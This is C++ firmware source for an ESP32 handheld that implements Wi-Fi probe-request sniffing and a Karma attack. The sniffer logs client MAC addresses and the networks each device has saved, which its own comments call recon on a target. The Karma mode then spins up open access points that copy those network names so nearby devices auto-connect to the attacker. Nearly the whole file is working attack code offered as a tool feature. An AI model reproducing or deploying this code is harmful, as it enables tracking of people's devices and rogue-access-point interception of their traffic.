/*
 * wifi_probe + wifi_karma
 *
 * Probe Sniff: listens in promiscuous mode for probe request frames
 * (subtype 0x4). Every probe reveals a client MAC + an SSID the device
 * has saved. Useful recon — tells you which networks a target has
 * connected to in the past.
 *
 * Karma Attack: probe sniff, but when we see a new SSID, we immediately
 * spin up a SoftAP with that exact SSID. Many devices auto-connect to
 * a network they've saved, so they associate with us. Iterates through
 * the most recently seen probes every few seconds to cast a wide net.
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include <WiFi.h>
#include <esp_wifi.h>

#define PROBE_MAX 32

struct probe_t {
    uint8_t  client[6];
    char     ssid[33];
    uint32_t last_seen;
    int8_t   rssi;
};

static probe_t s_probes[PROBE_MAX];
static int     s_probe_count = 0;
static volatile uint32_t s_probe_total = 0;
static volatile bool s_karma_mode = false;
static char s_karma_ssid[33] = "";

static int find_probe(const uint8_t *client, const char *ssid)
{
    for (int i = 0; i < s_probe_count; ++i) {
        if (memcmp(s_probes[i].client, client, 6) == 0 &&
            strcmp(s_probes[i].ssid, ssid) == 0) return i;
    }
    return -1;
}

static void probe_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = pkt->payload;
    if (pkt->rx_ctrl.sig_len < 26) return;

    uint8_t subtype = (p[0] >> 4) & 0xF;
    if (subtype != 0x4) return;  /* probe request */

    const uint8_t *client = p + 10;
    /* Tag 0 = SSID, directly after header (offset 24). */
    if (pkt->rx_ctrl.sig_len < 26) return;
    uint8_t tag_id  = p[24];
    uint8_t tag_len = p[25];
    if (tag_id != 0 || tag_len == 0 || tag_len > 32) return;
    if (pkt->rx_ctrl.sig_len < 26U + tag_len) return;

    char ssid[33] = {0};
    memcpy(ssid, p + 26, tag_len);
    ssid[tag_len] = '\0';

    s_probe_total++;

    int idx = find_probe(client, ssid);
    if (idx < 0) {
        if (s_probe_count >= PROBE_MAX) {
            /* Evict oldest. */
            int oldest = 0;
            for (int i = 1; i < s_probe_count; ++i)
                if (s_probes[i].last_seen < s_probes[oldest].last_seen) oldest = i;
            idx = oldest;
        } else {
            idx = s_probe_count++;
        }
        memcpy(s_probes[idx].client, client, 6);
        strncpy(s_probes[idx].ssid, ssid, 32);
        s_probes[idx].ssid[32] = '\0';
    }
    s_probes[idx].last_seen = millis();
    s_probes[idx].rssi = pkt->rx_ctrl.rssi;
}

static void draw_probe_list(int cursor)
{
    auto &d = M5Cardputer.Display;
    ui_clear_body();
    d.setTextColor(T_ACCENT, T_BG);
    d.setCursor(4, BODY_Y + 2);
    if (s_karma_mode) {
        d.printf("KARMA  total:%lu  lure:%s",
                 (unsigned long)s_probe_total,
                 s_karma_ssid[0] ? s_karma_ssid : "(none)");
    } else {
        d.printf("PROBES  seen:%lu", (unsigned long)s_probe_total);
    }
    d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT);

    if (s_probe_count == 0) {
        d.setTextColor(T_DIM, T_BG);
        d.setCursor(4, BODY_Y + 24);
        d.print("listening for probe requests...");
        return;
    }

    int rows = 8;
    int first = cursor - rows / 2;
    if (first < 0) first = 0;
    if (first + rows > s_probe_count) first = max(0, s_probe_count - rows);

    for (int r = 0; r < rows && first + r < s_probe_count; ++r) {
        const probe_t &p = s_probes[first + r];
        int y = BODY_Y + 16 + r * 11;
        bool sel = (first + r == cursor);
        uint16_t bg = sel ? 0x18C7 : T_BG;
        if (sel) d.fillRect(0, y - 1, SCR_W, 11, bg);

        d.setTextColor(T_DIM, bg);
        d.setCursor(2, y);
        d.printf("%02X%02X", p.client[4], p.client[5]);
        d.setTextColor(T_ACCENT, bg);
        d.setCursor(32, y);
        d.printf("%4d", p.rssi);
        d.setTextColor(sel ? T_ACCENT : T_FG, bg);
        d.setCursor(64, y);
        d.printf("%.24s", p.ssid);
    }
}

static void run_probe_or_karma(bool karma)
{
    radio_switch(RADIO_WIFI);
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(probe_cb);

    s_probe_count = 0;
    s_probe_total = 0;
    s_karma_mode = karma;
    s_karma_ssid[0] = '\0';

    ui_draw_footer(karma ? "ENTER=lure sel.  `=stop"
                         : "`=stop");

    int cursor = 0;
    uint32_t last_redraw = 0;
    uint32_t last_karma  = 0;
    while (true) {
        uint32_t now = millis();
        if (now - last_redraw > 400) {
            last_redraw = now;
            draw_probe_list(cursor);
        }
        if (karma && now - last_karma > 8000 && s_probe_count > 0) {
            last_karma = now;
            /* Rotate through seen SSIDs — pretend to be each one briefly.
             * Keeps the AP cycling so we catch different clients. */
            int pick = (now / 8000) % s_probe_count;
            strncpy(s_karma_ssid, s_probes[pick].ssid, 32);
            s_karma_ssid[32] = '\0';
            /* Start/restart SoftAP in parallel with promisc sniff. */
            esp_wifi_set_promiscuous(false);
            WiFi.mode(WIFI_AP);
            WiFi.softAP(s_karma_ssid, nullptr, 1, 0, 4);
            delay(100);
            WiFi.mode(WIFI_STA);  /* back to sniffing */
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(probe_cb);
        }

        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;

        switch (k) {
        case ';': case PK_UP:   if (cursor > 0) cursor--; break;
        case '.': case PK_DOWN: if (cursor + 1 < s_probe_count) cursor++; break;
        case PK_ENTER:
            if (karma && cursor < s_probe_count) {
                strncpy(s_karma_ssid, s_probes[cursor].ssid, 32);
                s_karma_ssid[32] = '\0';
                last_karma = now;  /* force immediate AP restart */
                esp_wifi_set_promiscuous(false);
                WiFi.mode(WIFI_AP);
                WiFi.softAP(s_karma_ssid, nullptr, 1, 0, 4);
                delay(100);
                WiFi.mode(WIFI_STA);
                esp_wifi_set_promiscuous(true);
                esp_wifi_set_promiscuous_rx_cb(probe_cb);
            }
            break;
        }
    }

    esp_wifi_set_promiscuous(false);
    WiFi.softAPdisconnect(true);
}

void feat_wifi_probe(void) { run_probe_or_karma(false); }
void feat_wifi_karma(void) { run_probe_or_karma(true);  }
